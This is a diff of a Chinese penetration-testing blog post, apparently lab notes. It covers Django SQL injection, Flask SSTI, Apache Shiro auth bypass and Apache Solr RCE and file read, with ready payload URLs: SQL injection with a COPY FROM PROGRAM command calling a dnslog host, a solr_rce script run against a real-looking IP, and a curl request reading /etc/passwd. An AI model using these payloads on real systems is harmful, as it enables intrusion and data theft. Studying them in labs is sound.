+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单引号已注入成功，SQL语句报错</span></span><br><span class="line">/admin/vuln/collection/?detail__a%27b=123</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建cmd_exec</span></span><br><span class="line">/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)--%20</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">调用cmd_exec执行命令，用dnslog接收回显判断是否存在命令执行：</span></span><br><span class="line">/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz.dnslog.cn%27--%20</span><br></pre></td></tr></table></figure>
+<p>（2）django CVE-2021-35042</p>
 <p>漏洞复现：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yODMyNjIuaHRtbA==">https://www.freebuf.com/vuls/283262.html</span></p>
-<p>Django 组件存在 SQL 注入漏洞，该漏洞是由于对 QuerySet.order_by () 中<br>
-用户提供数据的过滤不足，攻击者可利用该漏洞在未授权的情况下，构造恶意<br>
-数据执行 SQL 注入攻击，最终造成服务器敏感信息泄露。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">找到可以进行数据注入的地方，进行构造，直接注入获取敏感信息。</span><br><span class="line">/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@ba</span><br><span class="line">sedir)),1)%23</span><br><span class="line">/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version</span><br><span class="line">())),1)%23</span><br><span class="line">/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20databa</span><br><span class="line">se())),1)%23</span><br></pre></td></tr></table></figure>
-<p>（ 3 ）Django SQL 注入漏洞 CVE- 2022 - 28346</p>
-<p>攻击者使用精心编制的字典， 通过 **kwargs 传递给 QuerySet.annotate ()、<br>
-aggregate () 和 extra () 这些方法，可导致这些方法在列别名中受到 SQL 注入攻击。<br>
-漏洞复现：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NzU2NzY1NS9hcnRpY2xlL2RldGFpbHMvMTI1NjIzNzg0">https://blog.csdn.net/weixin_57567655/article/details/125623784</span><br>
- 通过报错页面可以发现存在哪些接口，访问接口如果存在传参，同样会提<br>
-示报错信息<br>
-使用报错提示的参数进行 sql 注入：<br>
-<span class="exturl" data-url="aHR0cDovL3gueC54Lng6ODAwMC9kZW1vP2ZpZWxkPWRlbW8ubmFtZSUyMg==">http://x.x.x.x:8000/demo?field=demo.name&quot;</span> FROM “demo_user” union SELEC<br>
-T “1”,sqlite_version(),“3” –</p>
-<p>（ 4 ）flask SSTI 模板注入</p>
-<p>复现地址：<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2ZsYXNrL3NzdGkv">https://vulhub.org/#/environments/flask/ssti/</span><br>
- 访问 http://your-ip/?name=54289，得到 54289 ，说明 SSTI 漏洞存在。<br>
-可尝试执行命令，反弹 shell 等操作。一般参数为默认的 404_url 和 name，<br>
-如果无法确定参数的话需要用字典进行测试。</p>
-<h4 id="345-java-apache框架shirosorl"><a class="markdownIt-Anchor" href="#345-java-apache框架shirosorl">#</a> 3.4.5 java- apache 框架 Shiro/Sorl</h4>
-<p>（ 1 ）Apache Shiro 漏洞</p>
-<p>Apache Shiro 是一个强大且易用的 Java 安全框架，用于身份验证、授权、<br>
-密码和会话管理。<br>
-判断：大多会发生在登录处，返回包里包含 remeberMe=deleteMe 字段</p>
-<p>apache shiro 的历史漏洞如下，作简单了解：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞【CVE- 2016 - 4483 】</span><br><span class="line">Apache Shiro &lt; 1.3.2 验证绕过漏洞【CVE- 2016 - 2807 】</span><br><span class="line">Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 【CVE- 2019 - 12442 】</span><br><span class="line">Apache Shiro &lt; 1.5.2 验证绕过漏洞 【CVE- 2020 - 1957 】</span><br><span class="line">Apache Shiro &lt; 1.5.3 验证绕过漏洞 【CVE- 2020 - 11989 】</span><br><span class="line">Apahce Shiro &lt; 1.6.0 验证绕过漏洞 【CVE- 2020 - 13933 】</span><br><span class="line">Apahce Shiro &lt; 1.7.1 权限绕过漏洞 【CVE- 2020 - 17523 】</span><br></pre></td></tr></table></figure>
-<p>a. CVE_2016_4437 Shiro-550+Shiro- 721<br>
- 用工具直接爆破出密钥，在继续执行命令，但是已经很老，很难碰到<br>
- b. CVE- 2020 - 11989<br>
+<p>Django 组件存在 SQL 注入漏洞，该漏洞是由于对 QuerySet.order_by () 中用户提供数据的过滤不足，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行 SQL 注入攻击，最终造成服务器敏感信息泄露。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到可以进行数据注入的地方，进行构造，直接注入获取敏感信息。</span></span><br><span class="line">/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23</span><br><span class="line">/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23</span><br><span class="line">/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%23</span><br></pre></td></tr></table></figure>
+<p>（3）Django SQL 注入漏洞 CVE-2022-28346</p>
+<p>攻击者使用精心编制的字典， 通过 kwargs 传递给 QuerySet.annotate ()、aggregate () 和 extra () 这些方法，可导致这些方法在列别名中受到 SQL 注入攻击。</p>
+<p>漏洞复现：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NzU2NzY1NS9hcnRpY2xlL2RldGFpbHMvMTI1NjIzNzg0">https://blog.csdn.net/weixin_57567655/article/details/125623784</span></p>
+<p>通过报错页面可以发现存在哪些接口，访问接口如果存在传参，同样会提示报错信息</p>
+<p>使用报错提示的参数进行 sql 注入：<br>
+ <code>http://x.x.x.x:8000/demo?field=demo.name&quot;FROM &quot;demo_user&quot; union SELECT &quot;1&quot;,sqlite_version(),&quot;3&quot; --</code></p>
+<p>（4）flask SSTI 模板注入</p>
+<p>复现地址：<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2ZsYXNrL3NzdGkv">https://vulhub.org/#/environments/flask/ssti/</span></p>
+<p>访问 http://your-ip/?name=54289，得到 54289 ，说明 SSTI 漏洞存在。</p>
+<p>可尝试执行命令，反弹 shell 等操作。一般参数为默认的 404_url 和 name，如果无法确定参数的话需要用字典进行测试。</p>
+<h4 id="shiro-sorl"><a class="markdownIt-Anchor" href="#shiro-sorl">#</a> Shiro Sorl</h4>
+<p>（1）Apache Shiro 漏洞</p>
+<p>Apache Shiro 是一个强大且易用的 Java 安全框架，用于身份验证、授权、密码和会话管理。</p>
+<p>判断：大多会发生在登录处，返回包里包含 remeberMe=deleteMe 字段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">apache shiro的历史漏洞如下，作简单了解：</span></span><br><span class="line">Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483 】</span><br><span class="line">Apache Shiro &lt; 1.3.2 验证绕过漏洞【CVE-2016-2807 】</span><br><span class="line">Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442 】</span><br><span class="line">Apache Shiro &lt; 1.5.2 验证绕过漏洞 【CVE-2020-1957 】</span><br><span class="line">Apache Shiro &lt; 1.5.3 验证绕过漏洞 【CVE-2020-11989 】</span><br><span class="line">Apahce Shiro &lt; 1.6.0 验证绕过漏洞 【CVE-2020-13933 】</span><br><span class="line">Apahce Shiro &lt; 1.7.1 权限绕过漏洞 【CVE-2020-17523 】</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>CVE_2016_4437 Shiro-550+Shiro-721<br>
+ 用工具直接爆破出密钥，在继续执行命令，但是已经很老，很难碰到</p>
+</li>
+<li>
+<p>CVE-2020-11989<br>
 Poc：/admin/%20 影响范围：Apache Shiro &lt; 1.7.1<br>
-<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L3NoaXJvLWN2ZS0=">https://github.com/jweny/shiro-cve-</span> 2020 - 17523<br>
- 当看到当前 java 引入了 shiro 依赖，切其版本在指定范围内就可以进行测试<br>
- c. CVE- 2020 - 1957<br>
+<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L3NoaXJvLWN2ZS0yMDIwLTE3NTIz">https://github.com/jweny/shiro-cve-2020-17523</span><br>
+ 当看到当前 java 引入了 shiro 依赖，切其版本在指定范围内就可以进行测试</p>
+</li>
+<li>
+<p>CVE-2020-1957<br>
 Poc：/xxx/…;/admin/ 影响范围：Apache Shiro &lt; 1.5.3<br>
- 验证绕过，访问构造的地址构造恶意 url 地址之后可以跳过登录认证，如何<br>
-获取这个 url 地址可以拿到源码构造可以在线搜索或者抓包进行寻找。实际出现<br>
-了 shiro 这个版本再去想找相应的利用方法。</p>
-<p>（ 2 ）Apache Solr 漏洞</p>
-<p>Apache Solr 是一个开源的搜索服务，使用 Java 语言开发，主要基于 HTTP<br>
- 和 Apache Lucene 实现的。Solr 是一个高性能，采用 Java5 开发，基于 Lucene 的<br>
-全文搜索服务器。<br>
-漏洞判断：<span class="exturl" data-url="aHR0cHM6Ly9hdmQuYWxpeXVuLmNvbS9zZWFyY2g/cT1zb2xy">https://avd.aliyun.com/search?q=solr</span></p>
-<p>apache solr 的历史漏洞如下，作简单了解：<br>
-远程命令执行 RCE（CVE- 2017 - 12629 ）<br>
-远程命令执行 XXE（CVE- 2017 - 12629 ）<br>
-任意文件读取 AND 命令执行（CVE- 2019 - 17558 ）<br>
-远程命令执行漏洞 (CVE- 2019 - 0192)<br>
- 远程命令执行漏洞 (CVE- 2019 - 0193)<br>
- 未授权上传漏洞 (CVE- 2020 - 13957)<br>
-Apache Solr SSRF (CVE- 2021 - 27905)</p>
-<p>a. CVE- 2017 - 12629 远程命令执行 RCE<br>
-Apache solr&lt;7.1.0 版本，直接通过 burp 抓包修改数据即可<br>
- Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基<br>
-于 HTTP 和 Apache Lucene 实现。原理大致是文档通过 Http 利用 XML 加到一<br>
-个搜索集合中。查询该集合也是通过 http 收到一个 XML/JSON 响应来实现。此<br>
-次 7.1.0 之前版本总共爆出两个漏洞：XML 实体扩展漏洞（XXE）和远程命令<br>
-执行漏洞（RCE），二者可以连接成利用链，编号均为 CVE- 2017 - 12629 。</p>
-<h1 id="httpsvulhuborgenvironmentssolrcve-"><a class="markdownIt-Anchor" href="#httpsvulhuborgenvironmentssolrcve-">#</a> <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvQ1ZFLQ==">https://vulhub.org/#/environments/solr/CVE-</span> 2017 - 12629 - RCE/</h1>
-<p>b. CVE- 2019 - 17558 Apache Solr Velocity 注入远程命令执行漏洞<br>
- Apache Solr 是一个开源的搜索服务器。在其 5.0.0 到 8.3.1 版本中，用户<br>
-可以注入自定义模板，通过 Velocity 模板语言执行任意命令。<br>
-<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vc29scl9yY2U=">https://github.com/jas502n/solr_rce</span><br>
-D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy41OC4yMzYuNzY6NTA4NDc=">http://123.58.236.76:50847</span> id<br>
-#<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvc29sci9DVkUt">https://github.com/vulhub/vulhub/blob/master/solr/CVE-</span> 2019 - 1755 8/READ<br>
-<span class="exturl" data-url="aHR0cDovL01FLnpoLWNuLm1k">ME.zh-cn.md</span><br>
- 在实战中，当发现有 Solr 资产时，可直接通过脚本测试，没有就是没有</p>
-<p>c. CVE- 2019 - 0193 Apache Solr 远程命令执行漏洞<br>
- Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基<br>
-于 HTTP 和 Apache Lucene 实现。此次漏洞出现在 Apache Solr 的<br>
- DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源<br>
-中提取数据。它具有一个功能，其中所有的 DIH 配置都可以通过外部请求的<br>
- dataConfig 参数来设置。由于 DIH 配置可以包含脚本，因此攻击者可以通过构<br>
-造危险的请求，从而造成远程命令执行。</p>
-<h1 id="httpsvulhuborgenvironmentssolrcve--2"><a class="markdownIt-Anchor" href="#httpsvulhuborgenvironmentssolrcve--2">#</a> <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvQ1ZFLQ==">https://vulhub.org/#/environments/solr/CVE-</span> 2019 - 0193/</h1>
-<p>有两个前提条件，一个是有未授权或者弱密码可以进入后台，二是后台里<br>
-边已经创建过一个模板，如果满足，可以修改再后台用 debug 模式调整<br>
- dataConfig 的代码，加入反弹 shell 的命令即可利用</p>
-<p>d. CVE- 2021 - 27905 Apache Solr RemoteStreaming 文件读取与 SSRF 漏洞<br>
- Apache Solr 是一个开源的搜索服务器。在 Apache Solr 未开启认证的情况<br>
-下，攻击者可直接构造特定请求开启特定配置，并最终造成 SSRF 或任意文件<br>
-读取。</p>
-<h1 id="httpsvulhuborgenvironmentssolrremote-streaming-fileread"><a class="markdownIt-Anchor" href="#httpsvulhuborgenvironmentssolrremote-streaming-fileread">#</a> <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvUmVtb3RlLVN0cmVhbWluZy1GaWxlcmVhZC8=">https://vulhub.org/#/environments/solr/Remote-Streaming-Fileread/</span></h1>
-<p>最后获取信息的 payload 如下：curl -i -s -k’<span class="exturl" data-url="aHR0cDovL3lvdXItaXA6ODk4My9zb2xyL2RlbW8=">http://your-ip:8983/solr/demo</span><br>
-/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd’<br>
-可以调整 file 协议为其他协议如 http，通过访问 dnslog 来验证漏洞存在</p>
+ 验证绕过，访问构造的地址构造恶意 url 地址之后可以跳过登录认证，如何获取这个 url 地址可以拿到源码构造可以在线搜索或者抓包进行寻找。实际出现了 shiro 这个版本再去想找相应的利用方法。</p>
+</li>
+</ul>
+<p>（2）Apache Solr 漏洞</p>
+<p>Apache Solr 是一个开源的搜索服务，使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现的。Solr 是一个高性能，采用 Java5 开发，基于 Lucene 的全文搜索服务器。</p>
+<p>漏洞判断：<span class="exturl" data-url="aHR0cHM6Ly9hdmQuYWxpeXVuLmNvbS9zZWFyY2g/cT1zb2xy">https://avd.aliyun.com/search?q=solr</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">apache solr的历史漏洞如下，作简单了解：</span></span><br><span class="line">远程命令执行RCE（CVE-2017-12629 ）</span><br><span class="line">远程命令执行XXE（CVE-2017-12629 ）</span><br><span class="line">任意文件读取AND命令执行（CVE-2019-17558 ）</span><br><span class="line">远程命令执行漏洞(CVE-2019-0192)</span><br><span class="line">远程命令执行漏洞(CVE-2019-0193)</span><br><span class="line">未授权上传漏洞(CVE-2020-13957)</span><br><span class="line">Apache Solr SSRF (CVE-2021-27905)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>CVE-2017-12629 远程命令执行 RCE</li>
+</ul>
+<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过 Http 利用 XML 加到一 个搜索集合中。查询该集合也是通过 http 收到一个 XML/JSON 响应来实现。此 次 7.1.0 之前版本总共爆出两个漏洞：XML 实体扩展漏洞 (XXE) 和远程命令执行漏洞 (RCE)，二者可以连接成利用链，编号均为 CVE-2017-12629。</p>
+<p>漏洞复现:<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvQ1ZFLTIwMTctMTI2MjktUkNFLw==">https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/</span></p>
+<p>Apache solr&lt;7.1.0 版本，直接通过 burp 抓包修改数据即可</p>
+<ul>
+<li>CVE-2019-17558 Apache Solr Velocity 注入远程命令执行漏洞</li>
+</ul>
+<p>Apache Solr 是一个开源的搜索服务器。在其 5.0.0 到 8.3.1 版本中，用户可以注入自定义模板，通过 Velocity 模板语言执行任意命令。</p>
+<p>漏洞复现:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vc29scl9yY2U=">https://github.com/jas502n/solr_rce</span><br>
+ 漏洞说明:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvc29sci9DVkUtMjAxOS0xNzU1OC9SRUFETUUuemgtY24ubWQ=">https://github.com/vulhub/vulhub/blob/master/solr/CVE-2019-17558/README.zh-cn.md</span></p>
+<p><code>D:\Python27\python.exe solr_rce.py http://123.58.236.76:50847 id</code></p>
+<p><strong>在实战中，当发现有 Solr 资产时，可直接通过脚本测试，没有就是没有</strong></p>
+<ul>
+<li>CVE-2019-0193 Apache Solr 远程命令执行漏洞</li>
+</ul>
+<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基<br>
+于 HTTP 和 Apache Lucene 实现。此次漏洞出现在 Apache Solr 的 DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源 中提取数据。它具有一个功能，其中所有的 DIH 配置都可以通过外部请求的 dataConfig 参数来设置。由于 DIH 配置可以包含脚本，因此攻击者可以通过构 造危险的请求，从而造成远程命令执行。</p>
+<p>漏洞复现:<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvQ1ZFLTIwMTktMDE5My8=">https://vulhub.org/#/environments/solr/CVE-2019-0193/</span></p>
+<p>有两个前提条件，一个是有未授权或者弱密码可以进入后台，二是后台里边已经创建过一个模板，如果满足，可以修改再后台用 debug 模式调整 dataConfig 的代码，加入反弹 shell 的命令即可利用</p>
+<ul>
+<li>CVE-2021-27905 Apache Solr RemoteStreaming 文件读取与 SSRF 漏洞</li>
+</ul>
+<p>Apache Solr 是一个开源的搜索服务器。在 Apache Solr 未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成 SSRF 或任意文件读取。</p>
+<p>漏洞复现: <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NvbHIvUmVtb3RlLVN0cmVhbWluZy1GaWxlcmVhZC8=">https://vulhub.org/#/environments/solr/Remote-Streaming-Fileread/</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">最后获取信息的 payload 如下</span></span><br><span class="line">curl-i -s -k&#x27;http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以调整file协议为其他协议如http，通过访问dnslog来验证漏洞存在</span></span><br></pre></td></tr></table></figure>
 
+      <div class="tags">
+          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="ic i-tag"></i> 渗透测试</a>
+      </div>
   </div>
 
    <footer>
@@ -816,9 +478,9 @@ D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-07-04 01:45:14" itemprop="dateModified" datetime="2023-07-04T01:45:14+08:00">2023-07-04</time>
+    <time title="修改时间：2023-07-04 18:59:01" itemprop="dateModified" datetime="2023-07-04T18:59:01+08:00">2023-07-04</time>
   </span>
-  <span id="2023/07/04/SAFE/3 服务攻防/" class="item leancloud_visitors" data-flag-title="" title="阅读次数">
+  <span id="2023/07/04/SAFE/3 服务攻防/" class="item leancloud_visitors" data-flag-title="XD22 3 服务攻防" title="阅读次数">
       <span class="icon">
         <i class="ic i-eye"></i>
       </span>
@@ -860,7 +522,7 @@ D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="http://n1h1l157.github.io/2023/07/04/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" title="">http://n1h1l157.github.io/2023/07/04/SAFE/3 服务攻防/</a>
+    <a href="http://n1h1l157.github.io/2023/07/04/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" title="XD22 3 服务攻防">http://n1h1l157.github.io/2023/07/04/SAFE/3 服务攻防/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -879,20 +541,20 @@ D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy
     <div class="item left">
       
 
-  <a href="/2023/07/04/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;8LXqKFmt3HObeTC.jpg" title="XD22 Web 基础知识">
+  <a href="/2023/07/04/SAFE/5%20APP%E6%94%BB%E9%98%B2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;ukLG5BwF6jH1ONA.jpg" title="XD22 5 APP 攻防">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> 信息安全</span>
-  <h3>XD22 Web 基础知识</h3>
+  <h3>XD22 5 APP 攻防</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2023/07/04/SAFE/4%20API%E6%94%BB%E9%98%B2/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;BId2kKHmufXsrnl.jpg" title="未命名">
+  <a href="/2023/07/04/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;yxb6m3Ak4MhTNvU.jpg" title="XD22 2 Web 通用漏洞">
   <span class="type">下一篇</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>未命名</h3>
+  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
+  <h3>XD22 2 Web 通用漏洞</h3>
   </a>
 
     </div>
@@ -911,9 +573,12 @@ D:\Python27\python.exe solr_rce.py <span class="exturl" data-url="aHR0cDovLzEyMy
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text"> 3.1 数据库安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#311-mysql%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.1.</span> <span class="toc-text"> 3.1.1 mysql 未授权访问</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87docker-%E5%AE%89%E8%A3%85vulfocus"><span class="toc-number"></span> <span class="toc-text"> 通过 docker 安装 vulfocus</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%9C%B0%E5%9D%80httpsfofaprogithubiovulfocusinstall"><span class="toc-number"></span> <span class="toc-text"> 参考地址 https:&#x2F;&#x2F;fofapro.github.io&#x2F;vulfocus&#x2F;#&#x2F;INSTALL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#312-hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E5%8F%8Arce"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.1.2 hadoop 未授权及 RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#313-redis%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8A%E5%86%99ssh%E5%85%AC%E9%92%A5"><span class="toc-number">0.2.</span> <span class="toc-text"> 3.1.3 redis 定时任务及写 ssh 公钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#314-influxdb%E9%80%9A%E8%BF%87jwt%E4%BC%AA%E9%80%A0%E8%BA%AB%E4%BB%BD"><span class="toc-number">0.3.</span> <span class="toc-text"> 3.1.4 influxdb 通过 jwt 伪造身份</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#315-h2-database%E5%AE%9E%E7%8E%B0jndi%E6%B3%A8%E5%85%A5"><span class="toc-number">0.4.</span> <span class="toc-text"> 3.1.5 h2 database 实现 jndi 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#316-couchdb%E7%BA%B5%E5%90%91%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">0.5.</span> <span class="toc-text"> 3.1.6 Couchdb 纵向权限漏洞</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E5%8C%85%E5%90%AB%E4%B8%A4%E4%B8%AA%E7%BA%A6%E6%9D%9F%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number"></span> <span class="toc-text"> 发送包含两个约束的数据包：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#couchdb-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%9C%B0%E5%9D%80%E7%9B%B4%E6%8E%A5%E7%94%A8%E8%84%9A%E6%9C%AC%E5%AE%8C%E6%88%90%E5%B0%B1%E5%8F%AF%E4%BB%A5"><span class="toc-number"></span> <span class="toc-text"> Couchdb 任意命令执行漏洞的复现地址（直接用脚本完成就可以）：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#317-elasticsearch%E5%86%99%E5%85%A5webshell"><span class="toc-number">0.1.</span> <span class="toc-text"> 3.1.7 Elasticsearch 写入 webshell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%B4%A2%E5%BC%95%E6%96%87%E6%A1%A3"><span class="toc-number"></span> <span class="toc-text"> 首先创建一个恶意索引文档：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%8D%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84%E5%AD%98%E5%82%A8%E5%BA%93%E5%85%B6%E4%B8%ADlocation%E7%9A%84%E5%80%BC%E5%8D%B3%E4%B8%BA%E6%88%91%E8%A6%81%E5%86%99%E5%85%A5%E7%9A%84%E8%B7%AF%E5%BE%84"><span class="toc-number"></span> <span class="toc-text"> 再创建一个恶意的存储库，其中 location 的值即为我要写入的路径。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" 